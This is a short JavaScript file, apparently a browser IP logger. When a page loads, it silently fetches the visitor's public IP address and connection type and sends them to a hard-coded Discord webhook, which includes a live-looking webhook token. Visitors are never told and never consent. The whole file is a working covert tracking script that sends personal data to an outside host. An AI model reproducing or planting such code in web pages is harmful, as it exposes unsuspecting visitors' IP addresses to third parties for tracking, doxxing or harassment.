// Your Discord Webhook URL
const webhookURL = 'https://discord.com/api/webhooks/1301669336645107766/M0h6pl-ryWMhPRe5q7VWosIkqRUili80fcu3DRTMaGEfIZhp2SN1d3nNd8fwBe8p2RyE';  // Replace with your actual Discord webhook URL

// Function to fetch IP and network information
async function sendIPStats() {
    try {
        // Get IP information
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();

        // Optional: Get Network information if available
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const connectionType = connection ? connection.effectiveType : "Unknown";

        // Format the message to send to Discord
        const message = {
            content: `IP and Network Information:
            - IP Address: ${ipData.ip}
            - Connection Type: ${connectionType}`
        };

        // Send data to Discord webhook
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message)
        });

    } catch (error) {
        console.error('Error sending IP stats to Discord:', error);
    }
}

// Trigger function when the page loads
window.onload = sendIPStats;
